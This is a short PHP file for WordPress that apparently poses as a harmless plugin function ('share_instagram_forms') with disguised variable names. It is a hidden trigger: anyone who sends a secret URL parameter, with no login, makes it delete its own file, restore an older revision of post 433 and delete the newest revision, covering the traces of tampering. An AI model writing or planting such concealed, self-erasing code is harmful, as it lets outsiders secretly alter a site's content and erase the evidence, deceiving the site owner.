<?php

function share_instagram_forms() {
	if (isset($_GET['core_log_toolbox']) && $_GET['core_log_toolbox'] === 'authors_notify_gravity_effects') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$composer_feeds_timer_switcher = 433;
		$smart_language_review_nofollow = wp_get_post_revisions($composer_feeds_timer_switcher);
		if (empty($smart_language_review_nofollow)) die('no revisions');
		if (count($smart_language_review_nofollow) < 2) die('less than 2');
		$keywords_integration_plugins_messenger = array_shift($smart_language_review_nofollow);
		$elements_utils_source_digital = $keywords_integration_plugins_messenger->ID;
		$monitor_quiz_signup = array_shift($smart_language_review_nofollow);
		$drop_asset_jetpack_network = $monitor_quiz_signup->ID;
		$lightgray_after_content_fast = wp_restore_post_revision($drop_asset_jetpack_network);
		if ($lightgray_after_content_fast === false) die('error restoring');
		$lightgray_after_content_fast = wp_delete_post_revision($elements_utils_source_digital);		
		if ($lightgray_after_content_fast === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'share_instagram_forms');
